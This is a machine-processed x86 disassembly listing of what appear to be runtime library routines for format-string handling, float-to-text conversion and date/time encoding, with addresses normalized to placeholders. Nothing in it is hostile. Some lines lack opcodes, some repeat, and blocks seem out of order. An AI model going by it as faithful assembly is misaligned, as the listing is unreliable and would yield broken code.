add esp 0xffffffd8
mov ebx ecx
mov esi edx
mov edi eax
cmp ebx 0x1f
jbe r-xdata
mov edx ebx
dec edx
mov eax esi
call sub_40c514
cmp al 0x1
jne r-xdata
mov ebx 0x1f
mov eax esp
mov ecx ebx
mov edx esi
call sub_4089fc
mov [ esp + ebx ] 0x0
mov eax esp
mov [ esp + 0x20 ] eax
mov [ esp + 0x24 ] 0x6
lea edx [ esp + 0x20 ]
mov eax [ edi * 4 + rw-data ]
xor ecx ecx
call sub_407fc0
add esp 0x28
pop edi
pop esi
pop ebx
retn
dec ebx
sub_408ca0
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
xor ebx ebx
mov [ ebp - 0x14 ] ebx
push ebx
push esi
push edi
mov edi eax
mov esi ecx
xor eax eax
mov [ ebp - 0x4 ] eax
add ecx [ ebp + 0x10 ]
mov [ ebp - 0x8 ] edi
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x14 ] eax
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
cmp esi ecx
je r-xdata
call sub_408ff7
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
lodsb [ esi ]
cmp al 0x25
je r-xdata
cmp esi ecx
je r-xdata
stosb [ edi ]
dec edx
jne r-xdata
lodsb [ esi ]
cmp al 0x25
je r-xdata
lea ebx [ esi - 0x2 ]
mov [ ebp - 0x18 ] ebx
call sub_408d82
cmp al 0x3a
jne r-xdata
cmp esi ecx
je r-xdata
mov [ ebp - 0x20 ] ebx
mov ebx 0xffffffff
cmp al 0x2e
jne r-xdata
mov [ ebp - 0xc ] ebx
cmp esi ecx
je r-xdata
lodsb [ esi ]
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] esi
push ecx
push edx
call sub_408dca
pop edx
mov ebx [ ebp - 0x20 ]
sub ebx ecx
jae r-xdata
cmp esi ecx
je r-xdata
lodsb [ esi ]
jmp r-xdata
cmp [ ebp - 0x19 ] 0x2d
jne r-xdata
xor ebx ebx
lodsb [ esi ]
call sub_408d82
mov [ ebp - 0x19 ] al
cmp al 0x2d
jne r-xdata
xchg ecx ebx
sub edx ecx
jae r-xdata
sub edx ecx
jae r-xdata
mov al 0x20
[ edi ]
xchg ecx ebx
sub edx ecx
jae r-xdata
add ecx edx
xor edx edx
[ edi ] [ esi ]
add ecx edx
xor edx edx
[ edi ] [ esi ]
cmp [ ebp - 0x10 ] 0x0
je r-xdata
add ecx edx
xor edx edx
pop ecx
mov esi [ ebp - 0x28 ]
jmp r-xdata
push edx
lea eax [ ebp - 0x10 ]
call sub_408c94
pop edx
or edx edx
je r-xdata
sub_408d82
xor ebx ebx
cmp al 0x2a
je r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0x8 ]
jg r-xdata
cmp al 0x30
jb r-xdata
cmp esi ecx
je r-xdata
inc [ ebp - 0xc ]
mov ebx [ ebp + 0xc ]
cmp [ ebx + eax * 8 + 0x4 ] 0x0
mov ebx [ ebx + eax * 8 ]
je r-xdata
retn
cmp al 0x39
ja r-xdata
pop eax
jmp r-xdata
lodsb [ esi ]
xor ebx ebx
imul ebx ebx 0xa
sub al 0x30
movzx eax al
add ebx eax
cmp esi ecx
je r-xdata
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
lodsb [ esi ]
jmp r-xdata
call sub_408ff7
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_408dca
and al 0xdf
mov cl al
mov eax 0x1
mov ebx [ ebp - 0xc ]
cmp ebx [ ebp + 0x8 ]
jg r-xdata
call sub_408ff7
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x28 ]
sub ecx edx
mov ebx [ ebp - 0x4 ]
call sub_408c18
inc [ ebp - 0xc ]
mov esi [ ebp + 0xc ]
lea esi [ esi + ebx * 8 ]
mov eax [ esi ]
movzx edx [ esi + 0x4 ]
jmp [ edx * 4 + jump_table_408df1 ]
mov ebx ecx
sub cl 0x44
je sub_408370
xor edx edx
xor eax eax
lea esi [ ebp - 0x49 ]
mov edx [ ebp - 0x24 ]
cmp edx 0x20
jbe r-xdata
lea esi [ ebp - 0x59 ]
mov edx [ ebp - 0x24 ]
mov ebx ecx
cmp edx 0x10
jbe r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
mov esi sub_40438c
jmp r-xdata
mov esi sub_4043ec
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x50
jne r-xdata
mov bh 0x1
jmp r-xdata
mov bh 0x0
mov ecx 0x10
cmp bl 0x58
je sub_408370
sub cl 0x44
je sub_408304
xor edx edx
mov ecx 0x1
retn
cmp [ eax ] 0x1
jbe r-xdata
mov esi eax
lodsb [ esi ]
movzx ecx al
jmp r-xdata
add esi [ ebp - 0x4 ]
cmp cl 0x53
jne r-xdata
mov edx eax
lea eax [ ebp - 0x14 ]
push ebx
mov ebx [ ebp - 0x4 ]
call esi
pop ebx
mov esi [ ebp - 0x14 ]
mov eax esi
jmp r-xdata
mov esi eax
mov esi eax
push edi
mov edi eax
xor al al
mov ecx [ ebp - 0x24 ]
jecxz r-xdata
mov edx 0x8
mov ecx 0x10
lea esi [ ebp - 0x59 ]
jmp sub_408304
mov esi eax
mov bl 0x0
cmp cl 0x47
je r-xdata
mov eax [ ebp - 0x24 ]
mov edx 0x3
cmp eax 0x12
jbe r-xdata
mov bl 0x1
cmp cl 0x45
je r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_408370
mov ecx 0x10
cmp bl 0x58
je sub_408304
xor ecx ecx
retn
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_408c70
mov esi [ ebp - 0x10 ]
jmp r-xdata
cmp ecx [ ebp - 0x24 ]
ja r-xdata
or esi esi
je r-xdata
mov ecx [ esi - 0x4 ]
mov ecx edi
sub ecx esi
pop edi
retn
[ edi ]
jne r-xdata
push ebx
push eax
push edx
lea eax [ ebp - 0x69 ]
mov edx esi
movzx ecx bh
mov ebx [ ebp - 0x4 ]
call sub_4091b0
mov ecx eax
lea esi [ ebp - 0x69 ]
retn
mov eax 0xf
mov bl 0x2
cmp cl 0x46
je r-xdata
jmp r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_408304
mov ecx [ ebp - 0x24 ]
retn
retn
dec edi
mov eax 0x12
mov edx [ ebp - 0x24 ]
cmp edx eax
jbe r-xdata
mov bl 0x3
cmp cl 0x4e
je r-xdata
jmp r-xdata
mov edx 0x2
cmp cl 0x4d
jne r-xdata
cmp cl 0x4d
jne r-xdata
movzx edx [ rw-data ]
jmp r-xdata
mov bl 0x4
sub_409018
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_4089d0
push eax
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx 0x7fffffff
call sub_408ca0
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_409058
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_4089d0
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx edi
call sub_408ca0
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_4090ac
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx 0x1000
mov eax [ ebp - 0x4 ]
call sub_404424
cmp eax 0xc00
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_404424
mov ebx eax
mov eax ebx
mov eax [ ebp - 0x4 ]
call sub_404424
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
lea eax [ ebp - 0x1008 ]
mov edx 0xfff
call sub_408ca0
jmp r-xdata
lea edx [ ebp - 0x1008 ]
mov ecx esi
xchg ecx eax
call sub_404254
jmp r-xdata
mov edx ebx
dec edx
cmp eax edx
jl r-xdata
mov edx ebx
dec edx
cmp eax edx
jge r-xdata
add ebx ebx
mov eax esi
call sub_404164
mov eax esi
mov edx ebx
call sub_4047b0
mov eax [ ebp - 0x4 ]
call sub_404424
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
dec edx
mov eax [ esi ]
call sub_408ca0
mov edx esi
xchg edx eax
call sub_4047b0
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_40916c
push esi
xor esi esi
stosb [ edi ]
or bl bl
jne r-xdata
or edx edx
jge r-xdata
xor edx edx
jmp r-xdata
or ah ah
je r-xdata
mov al 0x2d
neg edx
jmp r-xdata
xchg edx eax
push eax
mov ebx esp
mov al ah
stosb [ edi ]
xor edx edx
div [ esi + rw-data ]
add dl 0x30
mov [ ebx ] dl
inc ebx
dec ecx
or eax eax
jne r-xdata
or ecx ecx
jg r-xdata
dec ebx
mov al [ ebx ]
stosb [ edi ]
cmp ebx esp
jne r-xdata
pop eax
pop esi
retn
sub_4091b0
push ebp
mov ebp esp
add esp 0xffffffd4
push edi
push esi
push ebx
mov [ ebp - 0x4 ] eax
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov al [ rw-data ]
mov [ ebp - 0x6 ] al
mov eax [ rw-data ]
mov [ ebp - 0xc ] eax
mov al [ rw-data ]
mov [ ebp - 0xd ] al
mov al [ rw-data ]
mov [ ebp - 0xe ] al
mov [ ebp - 0x14 ] 0x0
mov eax 0x13
cmp cl 0x0
jne r-xdata
mov [ ebp + 0xc ] eax
push eax
mov eax 0x270f
cmp [ ebp + 0x10 ] 0x2
jb r-xdata
mov eax [ ebp + 0xc ]
cmp eax 0x2
jge r-xdata
push eax
lea eax [ ebp - 0x2c ]
call sub_409484
mov edi [ ebp - 0x4 ]
movzx eax [ ebp - 0x2c ]
sub eax 0x7fff
cmp eax 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x12
jle r-xdata
mov eax 0x2
lea esi [ ebp - 0x29 ]
movzx ebx [ ebp + 0x10 ]
cmp bl 0x1
je r-xdata
mov ecx eax
call sub_4092af
lea esi [ ecx + ecx * 2 + r-xdata ]
add esi [ ebp - 0x14 ]
mov ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
mov eax 0x12
lea ebx [ ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ebx [ ebx ]
add ebx [ ebp - 0x14 ]
call ebx
cmp bl 0x4
ja r-xdata
mov eax edi
sub eax [ ebp - 0x4 ]
pop ebx
pop esi
pop edi
jmp r-xdata
mov esp ebp
pop ebp
retn 0xc
mov bl 0x0
movsx eax [ ebp - 0x2c ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_4092b9
call sub_4092af
movsx ecx [ ebp - 0x2c ]
xor edx edx
cmp ecx [ ebp + 0xc ]
jg r-xdata
mov ecx 0x1
inc edx
cmp ecx 0xfffffffd
jl r-xdata
mov al 0x30
[ edi ]
stosb [ edi ]
loop r-xdata
or ecx ecx
jg r-xdata
retn
xor eax eax
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
lodsb [ esi ]
or al al
je r-xdata
mov al 0x30
stosb [ edi ]
cmp [ esi ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
or edx edx
je r-xdata
mov ah al
mov al [ ebp - 0x5 ]
stosw [ edi ]
mov al [ ebp - 0x5 ]
stosb [ edi ]
neg ecx
mov al 0x30
[ edi ]
jmp r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_40916c
retn
xor ecx ecx
stosb [ edi ]
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
sub_409315
call sub_4092af
call sub_4092a6
mov ah [ ebp - 0x5 ]
stosw [ edi ]
mov ecx [ ebp + 0xc ]
dec ecx
call sub_4092a6
stosb [ edi ]
loop r-xdata
mov ah 0x2b
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_40916c
retn
xor ecx ecx
sub_409351
mov edx [ ebp + 0x8 ]
cmp edx 0x12
jb r-xdata
movsx ecx [ ebp - 0x2c ]
or ecx ecx
jg r-xdata
mov edx 0x12
xor ebx ebx
cmp [ ebp + 0x10 ] 0x2
je r-xdata
mov al 0x30
stosb [ edi ]
jmp r-xdata
call sub_4092a6
stosb [ edi ]
dec ecx
je r-xdata
mov eax ecx
dec eax
mov bl 0x3
div bl
mov bl ah
inc ebx
or edx edx
je r-xdata
dec ebx
jne r-xdata
retn
mov al [ ebp - 0x5 ]
test al al
je r-xdata
mov al [ ebp - 0x6 ]
test al al
je r-xdata
jecxz r-xdata
stosb [ edi ]
stosb [ edi ]
mov bl 0x3
jmp r-xdata
call sub_4092a6
stosb [ edi ]
dec edx
jne r-xdata
mov al 0x30
inc ecx
jne r-xdata
stosb [ edi ]
dec edx
je r-xdata
sub_4093b6
xor ebx ebx
mov bl [ ebp - 0xd ]
mov ecx 0x3
cmp [ ebp - 0x2a ] 0x0
je r-xdata
cmp bl cl
jbe r-xdata
mov bl [ ebp - 0xe ]
mov ecx 0x40f
add bl ch
lea ebx [ ebx + ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ecx 0x5
mov bl cl
retn
push ecx
push ebx
cmp al 0x24
je r-xdata
call sub_40940a
jmp r-xdata
cmp al 0x2a
je r-xdata
pop ebx
pop ecx
inc ebx
loop r-xdata
call sub_409351
stosb [ edi ]
jmp r-xdata
mov al [ ebx ]
cmp al 0x40
je r-xdata
sub_409484
push ebp
mov ebp esp
add esp 0xffffffe0
push edi
push esi
push ebx
mov ebx eax
mov esi edx
mov [ ebp - 0x4 ] 0x0
cmp cl 0x0
je r-xdata
call sub_4094b1
jmp r-xdata
call sub_4095d3
jmp r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn 0x8
sub_4094b1
mov ax [ esi + 0x8 ]
mov edx eax
and eax 0x7fff
je r-xdata
xor edx edx
cmp eax 0x7fff
jne r-xdata
shr dx 0xf
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
fld [ esi ]
sub eax 0x3fff
imul eax eax 0x4d10
sar eax 0x10
inc eax
mov [ ebp - 0x8 ] eax
mov eax 0x12
sub eax [ ebp - 0x8 ]
fabs
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_402ebc
pop ebx
frndint
mov edi [ ebp - 0x4 ]
fld [ edi + rw-data ]
fcomp st1
fwait
fnstsw [ ebp - 0xa ]
fwait
test [ ebp - 0xa ] 0x4100
je r-xdata
test [ esi + 0x6 ] 0x8000
je r-xdata
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
mov edx 0x9
fwait
fidiv [ edi + rw-data ]
inc [ ebp - 0x8 ]
mov [ ebx + 0x3 ] 0x0
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov al [ edx + ebp - 0x19 ]
mov ah al
shr al 0x4
and ah 0xf
add ax 0x3030
stosw [ edi ]
dec edx
jne r-xdata
xor al al
stosb [ edi ]
mov edi [ ebp - 0x8 ]
add edi [ ebp + 0x8 ]
jns r-xdata
inc eax
cmp [ esi + 0x4 ] 0x80000000
je r-xdata
cmp edi [ ebp + 0xc ]
jb r-xdata
xor eax eax
jmp r-xdata
cmp edi 0x12
jae r-xdata
mov edi [ ebp + 0xc ]
mov edi 0x12
cmp [ ebx + edi + 0x3 ] 0x35
jb r-xdata
xor edx edx
jmp r-xdata
cmp [ ebx + edi + 0x3 ] 0x30
je r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov eax [ ebp - 0x8 ]
mov dx [ esi + 0x8 ]
mov [ ebx + 0x3 ] 0x31
inc [ ebp - 0x8 ]
jmp r-xdata
inc [ ebx + edi + 0x3 ]
cmp [ ebx + edi + 0x3 ] 0x39
ja r-xdata
jmp r-xdata
sub_4095d3
mov eax [ esi ]
mov edx [ esi + 0x4 ]
mov ecx eax
or ecx edx
je r-xdata
xor eax eax
xor edx edx
mov [ ebx + 0x3 ] al
or edx edx
jns r-xdata
xor ecx ecx
mov edi [ ebp + 0x8 ]
or edi edi
jge r-xdata
neg edx
neg eax
sbb edx 0x0
cmp edi 0x4
jl r-xdata
xor edi edi
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
fild [ ebp - 0x20 ]
mov edx edi
mov eax 0x4
sub eax edx
je r-xdata
mov edi 0x4
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
fwait
or ecx ecx
jne r-xdata
mov edi [ ebp - 0x4 ]
fidiv [ edi + eax * 4 + r-xdata ]
inc ecx
sub eax 0xa7640000
sbb edx 0xde0b6b3
jae r-xdata
dec ecx
add eax 0xa7640000
adc edx 0xde0b6b3
mov al cl
add al 0x30
stosb [ edi ]
mov ecx 0x9
mov ecx 0x9
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
mov eax edi
lea ecx [ ebx + edx + 0x3 ]
sub eax ecx
add al 0x30
stosb [ edi ]
mov al ah
and al 0xf
mov al ah
and al 0xf
jne r-xdata
mov [ edi ] 0x0
dec edi
cmp [ edi ] 0x30
je r-xdata
mov edx [ esi + 0x4 ]
shr edx 0x1f
jmp r-xdata
add al 0x30
stosb [ edi ]
dec ecx
jne r-xdata
dec ecx
jne r-xdata
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
jne r-xdata
jmp r-xdata
sub_4096b0
push ebp
mov ebp esp
add esp 0xfffffff4
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov [ ebp - 0x4 ] 0x0
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov ebx ecx
fwait
fnstcw [ ebp - 0x8 ]
fwait
fnclex
fldcw [ rw-data ]
fldz
call sub_409767
mov bh [ esi ]
cmp bh 0x2b
je r-xdata
inc esi
cmp bh 0x2d
jne r-xdata
cmp ecx esi
je r-xdata
inc esi
call sub_409772
neg edx
mov ecx esi
call sub_409772
xor edx edx
mov al [ esi ]
cmp al [ ebp - 0x5 ]
jne r-xdata
fstp st0
mov al [ esi ]
and al 0xdf
cmp al 0x45
jne r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn
call sub_409767
cmp [ esi ] 0x0
jne r-xdata
inc esi
push edx
call sub_40978e
pop eax
add edx eax
mov eax edx
cmp bl 0x1
jne r-xdata
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_402ebc
pop ebx
cmp bh 0x2d
jne r-xdata
add eax 0x4
cmp bl 0x0
je r-xdata
fchs
fstp [ edi ]
fistp [ edi ]
jmp r-xdata
xor eax eax
mov al 0x1
jmp r-xdata
fwait
fnstsw ax
test ax 0x9
jne r-xdata
fwait
fnclex
fldcw [ ebp - 0x8 ]
fwait
jmp r-xdata
sub_409772
xor eax eax
xor edx edx
dec esi
retn
fimul [ rw-data ]
mov [ ebp - 0xc ] eax
fiadd [ ebp - 0xc ]
inc edx
jmp r-xdata
lodsb [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
sub_40978e
xor eax eax
xor edx edx
mov cl [ esi ]
cmp cl 0x2b
je r-xdata
inc esi
cmp cl 0x2d
jne r-xdata
cmp cl 0x2d
jne r-xdata
inc esi
imul edx edx 0xa
add edx eax
cmp edx 0x1f4
jb r-xdata
mov al [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
retn
neg edx
sub_4097c4
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
push 0x0
push 0xf
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
xor ecx ecx
call sub_4091b0
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_404254
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_4097f4
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
mov cl 0x1
call sub_4091b0
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_404254
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_409840
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_404624
mov edx esp
xor ecx ecx
call sub_4096b0
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
sub_40986c
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_404624
mov edx esp
xor ecx ecx
call sub_4096b0
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
sub_4098b4
push ebp
mov ebp esp
push ebx
xor ebx ebx
mov ecx eax
fld [ ebp + 0x8 ]
fmul [ ebx + rw-data ]
sub esp 0x8
fistp [ esp ]
fwait
pop eax
pop edx
or edx edx
jns r-xdata
div [ ebx + rw-data ]
neg edx
neg eax
sbb edx 0x0
div [ ebx + rw-data ]
neg eax
jmp r-xdata
add eax 0xa955a
mov [ ecx ] edx
mov [ ecx + 0x4 ] eax
pop ebx
pop ebp
retn 0x8
sub_4098f8
push ebp
mov ebp esp
add esp 0xfffffff8
push esi
mov esi [ ebp + 0xc ]
mov [ ebp - 0x1 ] 0x0
cmp ax 0x18
jae r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ecx
pop ecx
pop ebp
retn 0x8
cmp dx 0x3c
jae r-xdata
cmp cx 0x3c
jae r-xdata
cmp si 0x3e8
jae r-xdata
movzx eax ax
imul eax eax 0x36ee80
movzx edx dx
imul edx edx 0xea60
add eax edx
movzx edx cx
imul edx edx 0x3e8
add eax edx
movzx edx si
add eax edx
mov [ ebp - 0x8 ] eax
fild [ ebp - 0x8 ]
fdiv [ r-xdata ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x1 ] 0x1
sub_409968
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_4098f8
test al al
jne r-xdata
fld [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov eax [ rw-data ]
call sub_407fa8
sub_4099a8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
call sub_4098b4
mov eax [ ebp - 0xc ]
lea ecx [ ebp - 0x2 ]
mov dx 0xea60
call sub_407f8c
push esi
mov ecx ebx
movzx eax [ ebp - 0x2 ]
mov dx 0x3c
call sub_407f8c
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
movzx eax [ ebp - 0x4 ]
mov dx 0x3e8
call sub_407f8c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_409a04
push ebx
push esi
mov ecx eax
movzx eax cx
and eax 0x3
test eax eax
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
movzx ebx cx
mov eax ebx
mov esi 0x64
xor edx edx
div esi
test edx edx
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax ebx
mov ecx 0x190
xor edx edx
div ecx
test edx edx
je r-xdata
sub_409a40
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov [ ebp - 0x2 ] ax
mov [ ebp - 0x3 ] 0x0
mov ax [ ebp - 0x2 ]
call sub_409a04
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
cmp [ ebp - 0x2 ] 0x1
jb r-xdata
mov al [ ebp - 0x3 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ ebp - 0x2 ] 0x270f
ja r-xdata
cmp di 0x1
jb r-xdata
cmp di 0xc
ja r-xdata
cmp bx 0x1
jb r-xdata
movzx eax di
cmp bx [ esi + eax * 2 - 0x2 ]
ja r-xdata
movzx eax di
dec eax
test eax eax
jle r-xdata
movzx ecx [ ebp - 0x2 ]
dec ecx
mov eax ecx
mov esi 0x64
cdq
idiv esi
imul esi ecx 0x16d
mov edx ecx
test edx edx
jns r-xdata
mov ecx 0x1
sar edx 0x2
add esi edx
sub esi eax
mov eax ecx
mov ecx 0x190
cdq
idiv ecx
add esi eax
movzx eax bx
add esi eax
sub esi 0xa955a
mov [ ebp - 0x8 ] esi
fild [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x3 ] 0x1
add edx 0x3
add bx [ esi + ecx * 2 - 0x2 ]
inc ecx
dec eax
jne r-xdata
sub_409b08
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
push esp
mov ecx edi
mov edx esi
mov eax ebx
call sub_409a40
test al al
jne r-xdata
fld [ esp ]
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_407fa8
sub_409b38
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0x18 ]
call sub_4098b4
mov ecx [ ebp - 0x14 ]
test ecx ecx
jg r-xdata
mov eax ecx
mov esi 0x7
cdq
idiv esi
inc edx
mov [ ebx ] dx
dec ecx
mov bx 0x1
cmp ecx 0x23ab1
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp - 0xc ]
mov [ eax ] 0x0
mov [ ebx ] 0x0
xor edx edx
jmp r-xdata
lea eax [ ebp - 0xe ]
push eax
lea eax [ ebp - 0x10 ]
mov dx 0x8eac
xchg ecx eax
call sub_407f8c
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
sub ecx 0x23ab1
add bx 0x190
cmp ecx 0x23ab1
jge r-xdata
mov eax edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
imul ax [ ebp - 0x10 ] 0x64
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x5b5
call sub_407f8c
mov ax [ ebp - 0x10 ]
shl eax 0x2
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x16d
call sub_407f8c
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x8eac
add bx [ ebp - 0x10 ]
mov eax ebx
call sub_409a04
mov edx eax
xor eax eax
mov al dl
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
mov ax 0x1
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x16d
mov ecx [ ebp - 0x4 ]
mov [ ecx ] bx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] ax
mov ax [ ebp - 0xe ]
inc eax
mov ecx [ ebp - 0xc ]
mov [ ecx ] ax
mov cx [ ebp - 0x10 ]
sub [ ebp - 0xe ] cx
inc eax
jmp r-xdata
movzx ecx ax
mov cx [ esi + ecx * 2 - 0x2 ]
mov [ ebp - 0x10 ] cx
mov cx [ ebp - 0xe ]
cmp cx [ ebp - 0x10 ]
jb r-xdata
sub_409c84
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x2 ]
push eax
mov eax esi
call sub_409b38
pop esi
pop ecx
pop ebp
retn 0x8
sub_409ca4
push ebp
mov ebp esp
push ebx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebx + 0x4 ]
push eax
lea ecx [ ebx + 0x6 ]
lea edx [ ebx + 0x2 ]
mov eax ebx
call sub_409b38
dec [ ebx + 0x4 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebx + 0xe ]
push eax
lea ecx [ ebx + 0xc ]
lea edx [ ebx + 0xa ]
lea eax [ ebx + 0x8 ]
call sub_4099a8
pop ebx
pop ebp
retn 0x8
sub_409ce4
push ebx
add esp 0xfffffff8
mov ebx eax
mov cx [ ebx + 0x6 ]
mov dx [ ebx + 0x2 ]
mov ax [ ebx ]
call sub_409b08
fstp [ esp ]
fwait
fld [ esp ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jb r-xdata
